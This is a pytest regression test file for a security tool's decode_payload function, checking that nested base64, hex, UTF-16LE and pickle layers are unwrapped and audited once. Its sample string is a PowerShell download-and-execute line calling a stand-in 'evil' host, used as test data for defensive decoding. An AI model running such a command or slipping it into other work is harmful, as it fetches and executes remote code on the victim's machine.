"""Regression tests for decode_payload's nested decoding.

When the base64 layer decodes to hex, base64-wrapped UTF-16LE, or a
base64-encoded pickle, the inner layer must be decoded too.  The recursive
call used to go through the module-level ``decode_payload`` name, which is
the async MCP wrapper, and failed with ``AttributeError: 'coroutine' object
has no attribute 'get'``.
"""

from __future__ import annotations

import base64
import json
import pickle
from collections.abc import Iterator
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest

import mulder.server.tools.core  # noqa: F401 ensure tools are registered
from mulder.audit import AuditLog
from mulder.server.app import _tool_dispatch_sync

TEXT = "IEX (New-Object Net.WebClient).DownloadString('http://evil/x')"


def _b64(raw: bytes) -> str:
    return base64.b64encode(raw).decode()


@pytest.fixture()
def ctx(tmp_path: Path) -> Iterator[Any]:
    mock = MagicMock()
    mock.audit = AuditLog(tmp_path / "test.audit.jsonl")
    with patch("mulder.server.tools.core.get_ctx", return_value=mock):
        yield mock


def _decode(data: str) -> dict[str, Any]:
    return _tool_dispatch_sync["decode_payload"](data=data)  # type: ignore[no-any-return]


@pytest.mark.parametrize(
    "data",
    [
        _b64(TEXT.encode().hex().encode()),
        _b64((TEXT.encode().hex() + "\n").encode()),
        _b64(_b64(TEXT.encode("utf-16-le")).encode()),
    ],
    ids=["base64-hex", "base64-hex-trailing-newline", "base64-base64-utf16le"],
)
def test_nested_layer_is_decoded(ctx: Any, data: str) -> None:
    result = _decode(data)

    assert result["status"] == "success"
    assert result["results"]["decoded"] == TEXT
    assert len(result["results"]["layers"]) == 2


def test_nested_pickle_is_disassembled(ctx: Any) -> None:
    data = _b64(_b64(pickle.dumps({"cmd": "whoami"}, protocol=4)).encode())

    result = _decode(data)

    assert result["status"] == "success"
    assert "Pickle disassembly" in result["results"]["decoded"]


@pytest.mark.parametrize(
    ("data", "encoding"),
    [
        (_b64(TEXT.encode("utf-16-le")), "utf16le"),
        (_b64(TEXT.encode()), "base64"),
    ],
    ids=["encoded-command", "plain-base64"],
)
def test_single_layer_unchanged(ctx: Any, data: str, encoding: str) -> None:
    result = _decode(data)

    assert result["results"]["detected_encoding"] == encoding
    assert result["results"]["decoded"] == TEXT
    assert len(result["results"]["layers"]) == 1


def test_nested_decode_logs_one_audit_entry(ctx: Any, tmp_path: Path) -> None:
    _decode(_b64(TEXT.encode().hex().encode()))

    lines = (tmp_path / "test.audit.jsonl").read_text().splitlines()
    assert [json.loads(line)["tool_name"] for line in lines] == ["decode_payload"]
